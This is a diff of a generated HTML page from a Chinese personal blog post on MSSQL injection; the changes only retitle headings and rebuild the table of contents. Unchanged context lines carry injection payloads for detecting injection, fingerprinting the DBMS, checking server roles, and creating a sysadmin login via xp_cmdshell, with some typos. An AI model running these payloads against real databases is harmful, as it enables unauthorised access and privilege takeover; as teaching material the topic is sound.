@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="sqlserver数据库介绍及操作默认端口1433； 创建一个数据库，默认创建在路径中web.mdf; 任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；  基础的查询语句：增删改查 select * from table  数据库权限 sa、db、public权限 sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；   连接调用sqlser">
+  <meta name="description" content="sqlserver注入">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mssql注入">
 <meta property="og:url" content="https://bookchi.github.io/2019/03/23/mssql注入/index.html">
 <meta property="og:site_name" content="fuubar2">
-<meta property="og:description" content="sqlserver数据库介绍及操作默认端口1433； 创建一个数据库，默认创建在路径中web.mdf; 任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；  基础的查询语句：增删改查 select * from table  数据库权限 sa、db、public权限 sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；   连接调用sqlser">
+<meta property="og:description" content="sqlserver注入">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-23T05:09:32.528Z">
+<meta property="og:updated_time" content="2019-03-23T05:12:08.826Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mssql注入">
-<meta name="twitter:description" content="sqlserver数据库介绍及操作默认端口1433； 创建一个数据库，默认创建在路径中web.mdf; 任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；  基础的查询语句：增删改查 select * from table  数据库权限 sa、db、public权限 sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；   连接调用sqlser">
+<meta name="twitter:description" content="sqlserver注入">
 
 
 
@@ -372,7 +372,7 @@
                 
               
 
-              <time title="Created: 2019-03-23 12:51:10 / Modified: 13:09:32" itemprop="dateCreated datePublished" datetime="2019-03-23T12:51:10+08:00">2019-03-23</time>
+              <time title="Created: 2019-03-23 12:51:10 / Modified: 13:12:08" itemprop="dateCreated datePublished" datetime="2019-03-23T12:51:10+08:00">2019-03-23</time>
             
 
             
@@ -410,7 +410,7 @@
       
 
       
-        <a id="more"></a>
+        <h3 id="sqlserver注入"><a href="#sqlserver注入" class="headerlink" title="sqlserver注入"></a>sqlserver注入</h3><a id="more"></a>
 <h4 id="sqlserver数据库介绍及操作"><a href="#sqlserver数据库介绍及操作" class="headerlink" title="sqlserver数据库介绍及操作"></a>sqlserver数据库介绍及操作</h4><p>默认端口1433；</p>
 <p>创建一个数据库，默认创建在路径中web.mdf;</p>
 <p>任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；</p>
@@ -426,7 +426,7 @@
 <h4 id="连接调用sqlserver数据库"><a href="#连接调用sqlserver数据库" class="headerlink" title="连接调用sqlserver数据库"></a>连接调用sqlserver数据库</h4><p>调用数据库的代码，一般写在配置文件里面config, conn；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    set conn = server.createobject(&quot;adodb.connecton&quot;)</span><br><span class="line">    conn.open &quot;provider=sqloledb;source=local;uid=sa;pwd=***;database=database-name&quot;</span><br><span class="line"> %&gt;</span><br></pre></td></tr></table></figure>
 <p>可能在的目录：==inc==/conn.asp，config.asp，web.config</p>
-<h4 id="sqlserver注入"><a href="#sqlserver注入" class="headerlink" title="sqlserver注入"></a>sqlserver注入</h4><p>判断是否有注入</p>
+<h4 id="sqlserver注入-1"><a href="#sqlserver注入-1" class="headerlink" title="sqlserver注入"></a>sqlserver注入</h4><p>判断是否有注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1. 判断是否有注入  (会有变化)</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">/</span><br><span class="line">-0</span><br><span class="line">/*判断注入的方法是一样的*/</span><br><span class="line"></span><br><span class="line">2. 初步判断是否是mssql</span><br><span class="line">and user&gt;0</span><br><span class="line"></span><br><span class="line">3. 判断数据库系统</span><br><span class="line">and (select count(*) from sysobjects)&gt;0    /*mssql的系统表*/</span><br><span class="line">and (select count(*) from msysobjects)&gt;0   /*access的系统表*/</span><br><span class="line"></span><br><span class="line">4. 注入参数是字符</span><br><span class="line">and </span><br><span class="line"></span><br><span class="line">10. 测试权限结构   返回正常的话，就是对应的权限</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;serveradmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;setupadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;securityadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;diskadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;bulkadmin&apos;));--</span><br><span class="line">adn 1=(select IS_MEMBER(&apos;db_owner&apos;));--</span><br><span class="line"></span><br><span class="line">11. 添加mssql和系统账户</span><br><span class="line">exec master.dbo.sp_addlogin username;--</span><br><span class="line">exec master.dbo.sp_password null, username,password;--</span><br><span class="line">exec master.dbo.sp_addsrvrolemember sysadmin username;--</span><br><span class="line">exec master.dbo.xp_cmdshell username;--</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>手工判断注入</p>
@@ -697,7 +697,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver数据库介绍及操作"><span class="nav-number">1.</span> <span class="nav-text">sqlserver数据库介绍及操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#连接调用sqlserver数据库"><span class="nav-number">2.</span> <span class="nav-text">连接调用sqlserver数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver注入"><span class="nav-number">3.</span> <span class="nav-text">sqlserver注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver另类玩法"><span class="nav-number">4.</span> <span class="nav-text">sqlserver另类玩法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver差异备份、完全备份、权限入侵"><span class="nav-number">5.</span> <span class="nav-text">sqlserver差异备份、完全备份、权限入侵</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlserver注入"><span class="nav-number">1.</span> <span class="nav-text">sqlserver注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver数据库介绍及操作"><span class="nav-number">1.1.</span> <span class="nav-text">sqlserver数据库介绍及操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#连接调用sqlserver数据库"><span class="nav-number">1.2.</span> <span class="nav-text">连接调用sqlserver数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver注入-1"><span class="nav-number">1.3.</span> <span class="nav-text">sqlserver注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver另类玩法"><span class="nav-number">1.4.</span> <span class="nav-text">sqlserver另类玩法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlserver差异备份、完全备份、权限入侵"><span class="nav-number">1.5.</span> <span class="nav-text">sqlserver差异备份、完全备份、权限入侵</span></a></li></ol></li></ol></div>
             
 
           </div>
